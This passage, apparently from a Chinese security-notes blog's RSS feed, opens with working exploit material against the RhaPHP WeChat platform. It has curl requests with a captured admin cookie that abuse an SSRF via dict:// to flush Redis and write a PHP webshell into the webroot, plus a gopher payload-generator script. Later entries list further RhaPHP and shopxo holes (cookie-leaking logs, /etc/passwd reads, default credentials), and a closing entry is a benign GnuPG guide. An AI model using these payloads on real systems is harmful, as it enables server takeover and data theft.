&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Cookie: think_admin=think%3A%7B%22id%22%3A%221%22%2C%22admin_name%22%3A%22zhoulin1230%22%2C%22password%22%3A%22c843af71dc17c2e605946aa6f5346f0e%22%2C%22status%22%3A%221%22%2C%22ip%22%3A%2227.26.220.222%22%2C%22last_time%22%3A%221592559280%22%2C%22rand_str%22%3A%22TOdLnC%22%2C%22admin_id%22%3A%221%22%7D; PHPSESSID=i4tl25v8f369muq7qeddv6out3&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> --data-raw &lt;span style="color:#cd5555">&amp;#39;keyword=abc&amp;amp;type=image&amp;amp;reply_image=dict://redis:6379/flushall&amp;amp;image_staus_type=0&amp;#39;&lt;/span>
curl &lt;span style="color:#cd5555">&amp;#39;http://www.xxxxxxxx.com/mp/mp/addKeyword&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Cookie: think_admin=think%3A%7B%22id%22%3A%221%22%2C%22admin_name%22%3A%22zhoulin1230%22%2C%22password%22%3A%22c843af71dc17c2e605946aa6f5346f0e%22%2C%22status%22%3A%221%22%2C%22ip%22%3A%2227.26.220.222%22%2C%22last_time%22%3A%221592559280%22%2C%22rand_str%22%3A%22TOdLnC%22%2C%22admin_id%22%3A%221%22%7D; PHPSESSID=i4tl25v8f369muq7qeddv6out3&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> --data-raw &lt;span style="color:#cd5555">&amp;#39;keyword=abc&amp;amp;type=image&amp;amp;reply_image=dict://redis:6379/set:webshell:&amp;#34;\\x3c\\x3f\\x70\\x68\\x70\\x20\\x70\\x68\\x70\\x69\\x6e\\x66\\x6f\\x28\\x29\\x3b\\x20\\x65\\x78\\x69\\x74\\x3b\\x3f\\x3e\\x0a&amp;#34;&amp;amp;image_staus_type=0&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span>
curl &lt;span style="color:#cd5555">&amp;#39;http://www.xxxxxxxx.com/mp/mp/addKeyword&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Cookie: think_admin=think%3A%7B%22id%22%3A%221%22%2C%22admin_name%22%3A%22zhoulin1230%22%2C%22password%22%3A%22c843af71dc17c2e605946aa6f5346f0e%22%2C%22status%22%3A%221%22%2C%22ip%22%3A%2227.26.220.222%22%2C%22last_time%22%3A%221592559280%22%2C%22rand_str%22%3A%22TOdLnC%22%2C%22admin_id%22%3A%221%22%7D; PHPSESSID=i4tl25v8f369muq7qeddv6out3&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> --data-raw &lt;span style="color:#cd5555">&amp;#39;keyword=abc&amp;amp;type=image&amp;amp;reply_image=dict://redis:6379/config:set:dir:&amp;#34;/www/wwwroot/www.xxxxxxxx.com&amp;#34;&amp;amp;image_staus_type=0&amp;#39;&lt;/span>
curl &lt;span style="color:#cd5555">&amp;#39;http://www.xxxxxxxx.com/mp/mp/addKeyword&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Cookie: think_admin=think%3A%7B%22id%22%3A%221%22%2C%22admin_name%22%3A%22zhoulin1230%22%2C%22password%22%3A%22c843af71dc17c2e605946aa6f5346f0e%22%2C%22status%22%3A%221%22%2C%22ip%22%3A%2227.26.220.222%22%2C%22last_time%22%3A%221592559280%22%2C%22rand_str%22%3A%22TOdLnC%22%2C%22admin_id%22%3A%221%22%7D; PHPSESSID=i4tl25v8f369muq7qeddv6out3&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> --data-raw &lt;span style="color:#cd5555">&amp;#39;keyword=abc&amp;amp;type=image&amp;amp;reply_image=dict://redis:6379/config:set:dbfilename:&amp;#34;test.php&amp;#34;&amp;amp;image_staus_type=0&amp;#39;&lt;/span>
curl &lt;span style="color:#cd5555">&amp;#39;http://www.xxxxxxxx.com/mp/mp/addKeyword&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#39;Cookie: think_admin=think%3A%7B%22id%22%3A%221%22%2C%22admin_name%22%3A%22zhoulin1230%22%2C%22password%22%3A%22c843af71dc17c2e605946aa6f5346f0e%22%2C%22status%22%3A%221%22%2C%22ip%22%3A%2227.26.220.222%22%2C%22last_time%22%3A%221592559280%22%2C%22rand_str%22%3A%22TOdLnC%22%2C%22admin_id%22%3A%221%22%7D; PHPSESSID=i4tl25v8f369muq7qeddv6out3&amp;#39;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> --data-raw &lt;span style="color:#cd5555">&amp;#39;keyword=abc&amp;amp;type=image&amp;amp;reply_image=dict://redis:6379/save&amp;amp;image_staus_type=0&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="25-gopher协议">2.5 gopher协议&lt;/h3>
&lt;ul>
&lt;li>有时服务端在接收参数时,会对参数进行一次 &lt;code>urldecode&lt;/code>, 因此可能需要对 &lt;code>gopher&lt;/code> 进行连续两次 &lt;code>urlencode&lt;/code>&lt;/li>
&lt;li>gopher生成脚本 &lt;code>gopher.py&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">import urllib
&lt;span style="color:#00688b">protocol&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;gopher://&amp;#34;&lt;/span>
&lt;span style="color:#00688b">ip&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;redis&amp;#34;&lt;/span>
&lt;span style="color:#00688b">port&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;6379&amp;#34;&lt;/span>
&lt;span style="color:#00688b">shell&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;\n\n&amp;lt;?php phpinfo();?&amp;gt;\n\n&amp;#34;&lt;/span>
&lt;span style="color:#00688b">filename&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;shell.php&amp;#34;&lt;/span>
&lt;span style="color:#00688b">path&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;/data&amp;#34;&lt;/span>
&lt;span style="color:#00688b">passwd&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00688b">cmd&lt;/span>=[&lt;span style="color:#cd5555">&amp;#34;flushall&amp;#34;&lt;/span>
&lt;span style="color:#cd5555">&amp;#34;set 1 {}&amp;#34;&lt;/span>.format(shell.replace(&lt;span style="color:#cd5555">&amp;#34; &amp;#34;&lt;/span>,&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">IFS&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>)),
&lt;span style="color:#cd5555">&amp;#34;config set dir {}&amp;#34;&lt;/span>.format(path),
&lt;span style="color:#cd5555">&amp;#34;config set dbfilename {}&amp;#34;&lt;/span>.format(filename),
&lt;span style="color:#cd5555">&amp;#34;save&amp;#34;&lt;/span>
]
cmd.insert(0,&lt;span style="color:#cd5555">&amp;#34;AUTH {}&amp;#34;&lt;/span>.format(passwd))
&lt;span style="color:#00688b">payload&lt;/span>=protocol+ip+&lt;span style="color:#cd5555">&amp;#34;:&amp;#34;&lt;/span>+port+&lt;span style="color:#cd5555">&amp;#34;/_&amp;#34;&lt;/span>
def redis_format(arr):
&lt;span style="color:#00688b">CRLF&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;\r\n&amp;#34;&lt;/span>
&lt;span style="color:#00688b">redis_arr&lt;/span> = arr.split(&lt;span style="color:#cd5555">&amp;#34; &amp;#34;&lt;/span>)
&lt;span style="color:#00688b">cmd&lt;/span>=&lt;span style="color:#cd5555">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00688b">cmd&lt;/span>+=&lt;span style="color:#cd5555">&amp;#34;*&amp;#34;&lt;/span>+str(len(redis_arr))
&lt;span style="color:#8b008b;font-weight:bold">for&lt;/span> x in redis_arr:
&lt;span style="color:#00688b">cmd&lt;/span>+=CRLF+&lt;span style="color:#cd5555">&amp;#34;&lt;/span>$&lt;span style="color:#cd5555">&amp;#34;&lt;/span>+str(len((x.replace(&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">IFS&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>,&lt;span style="color:#cd5555">&amp;#34; &amp;#34;&lt;/span>))))+CRLF+x.replace(&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">IFS&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>,&lt;span style="color:#cd5555">&amp;#34; &amp;#34;&lt;/span>)
&lt;span style="color:#00688b">cmd&lt;/span>+=CRLF
&lt;span style="color:#8b008b;font-weight:bold">return&lt;/span> cmd
&lt;span style="color:#8b008b;font-weight:bold">for&lt;/span> x in cmd:
&lt;span style="color:#cd5555">&amp;#39;&amp;#39;&amp;#39; 如果需要两次url编码, 则再调一次urllib.quote() &amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#00688b">payload&lt;/span> += urllib.quote(urllib.quote(redis_format(x)))
print payload
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul></description></item><item><title>Docs: rhaphp</title><link>https://note.codiy.net/docs/2021/02/rhaphp/</link><pubDate>Sat, 27 Feb 2021 09:16:52 +0800</pubDate><guid>https://note.codiy.net/docs/2021/02/rhaphp/</guid><description>
&lt;h2 id="rhaphp介绍">RhaPHP介绍&lt;/h2>
&lt;ul>
&lt;li>一款半开源的微信第三方管理平台, 部分扩展功能插件是收费的.&lt;/li>
&lt;li>项目地址:&lt;a href="https://github.com/geesondog/rhaphp">https://github.com/geesondog/rhaphp&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="158版本存在的安全问题">1.5.8版本存在的安全问题&lt;/h2>
&lt;ul>
&lt;li>默认开启 info 级别日志, 日志可通过 http 请求直接下载, 下载路径 &lt;code>/runtime/log/202102/27.log&lt;/code>, info 级别日志将会包含后台登陆账号的 cookie 信息. &lt;strong>真香!!!&lt;/strong>&lt;/li>
&lt;li>存在&lt;strong>ssrf漏洞&lt;/strong>路由 &lt;code>mp/mp/addKeyword&lt;/code> POST 参数 &lt;code>keyword=abc&amp;amp;type=image&amp;amp;reply_image=dict://redis:6379/flushall&amp;amp;image_staus_type=0&lt;/code>&lt;/li>
&lt;li>可利用ssrf漏洞&lt;strong>上传任意格式文件&lt;/strong>,但无法确定保存的文件名&lt;/li>
&lt;li>RhaPHP1.5.8 版本使用的是 ThinkPHP5.1.35 框架, &lt;strong>存在反序列化利用链&lt;/strong>, 但还没找到合适的利用入口.&lt;/li>
&lt;li>图片上传仅检查后缀, 可通过 phar 文件绕过上传限制, 再配合反序列化入口函数进行爆破(但目前没有找到入口)&lt;/li>
&lt;li>上传文件直接使用的是文件md5作为文件名和路径, 可再本地模拟后获得上传后的最终路径&lt;/li>
&lt;li>低版本存在另一个ssrf漏洞, &lt;code>/mp/show/image?url=file:///etc/passwd&lt;/code>&lt;/li>
&lt;/ul></description></item><item><title>Docs: shopxo</title><link>https://note.codiy.net/docs/2021/02/shopxo/</link><pubDate>Sat, 27 Feb 2021 09:16:52 +0800</pubDate><guid>https://note.codiy.net/docs/2021/02/shopxo/</guid><description>
&lt;h2 id="shopxo介绍">shopxo介绍&lt;/h2>
&lt;ul>
&lt;li>一款半开源的企业级B2C免费开源电商系统.&lt;/li>
&lt;li>项目地址:&lt;a href="https://github.com/gongfuxiang/shopxo">https://github.com/gongfuxiang/shopxo&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="存在的安全问题">存在的安全问题&lt;/h2>
&lt;ul>
&lt;li>存在&lt;strong>ssrf漏洞&lt;/strong>和&lt;strong>反序列化利用链&lt;/strong>, 入口: &lt;code>index.php?s=/index/qrcode/download&amp;amp;url=$(echo -n 'file:///etc/passwd' | base64) | tr -d '\n'&lt;/code>&lt;/li>
&lt;li>存在许多演示站点, 默认账号密码 &lt;code>shopxo:shopxo&lt;/code>&lt;/li>
&lt;/ul></description></item><item><title>Docs: Gnupg Usage</title><link>https://note.codiy.net/docs/2020/11/gnupg-usage/</link><pubDate>Wed, 18 Nov 2020 15:20:27 +0800</pubDate><guid>https://note.codiy.net/docs/2020/11/gnupg-usage/</guid><description>
&lt;h2 id="gnupg-简介httpswikiarchlinuxorgindexphpgnupg_e7ae80e4bd93e4b8ade69687">&lt;a href="https://wiki.archlinux.org/index.php/GnuPG_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">gnupg 简介&lt;/a>&lt;/h2>
&lt;ul>
&lt;li>采用&lt;strong>主密码 + 非对称密钥对&lt;/strong>的形式进行信息的加解密&lt;/li>
&lt;li>只有&lt;strong>主密码&lt;/strong>或者只有&lt;strong>密钥对&lt;/strong>均不能正常加解密, 得配合起来用.&lt;/li>
&lt;li>私钥的导入和导出,都需要验证主密码&lt;/li>
&lt;li>应用一(A,B双方文件加密传输): A用B的公钥对文档进行加密后传送给B, B拿到加密文档后用B的私钥进行解密得到原文档.&lt;/li>
&lt;li>应用二(A,B双方进行文件加密并签名): A用B的公钥对文档进行加密,并用A自己的私钥进行签名(签章), B拿到后用B的私钥进行解密,并用A的公钥进行验签.&lt;/li>
&lt;/ul>
&lt;h2 id="gnupg-使用">gnupg 使用&lt;/h2>
&lt;ul>
&lt;li>创建新密钥对&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">gpg --full-gen-key
&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>导入私钥(公钥可由私钥生成，无需导入)&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">// 导入公钥或私钥
gpg --import xxx.pub.key
gpg --import xxx.sec.key
&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>信任密钥&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">// 方式1
cat &lt;span style="color:#cd5555">&amp;#39;trusted-key B2980F3D615692897D3F344FAC8E655219F3ABB3&amp;#39;&lt;/span> &amp;gt;&amp;gt; ~/.gnupg/gpg.conf
// 方式2, 选5 I trust ultimately
gpg --edit-key &amp;lt;user-id&amp;gt; trust
&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>列出公钥私钥&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">gpg --list-keys
gpg --list-secret-keys
&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>加密，解密，签名&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">// 加密文档, 使用对方公钥进行加密
gpg --recipient &amp;lt;user-id&amp;gt; --encrypt doc
// 解密文档
gpg --decrypt doc.gpg --output doc
// 对文档进行加密并签名
gpg --sign --recipient &amp;lt;user-id&amp;gt; --encrypt doc
&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>导出&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">// 导出公钥
gpg --export &amp;lt;user-id&amp;gt; &amp;gt; xxx.pub.key
// 导出公钥(以纯 ASCII 文本形式)
gpg --armor --export &amp;lt;user-id&amp;gt; &amp;gt; xxx.pub.asc
// 导出私钥
gpg --export-secret-keys &amp;lt;user-id&amp;gt; &amp;gt; xxx.sec.key
&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>管理已有密钥对&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">gpg --edit-key &amp;lt;user-id&amp;gt;
// 改密码
gpg --edit-key &amp;lt;user-id&amp;gt; passwd
// 改过期时间
gpg --edit-key &amp;lt;user-id&amp;gt; expire
&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>公钥服务器的使用&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">gpg --send-keys &amp;lt;key-id&amp;gt;
gpg --search-keys &amp;lt;key-id&amp;gt;
gpg --recv-keys &amp;lt;key-id&amp;gt;
&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>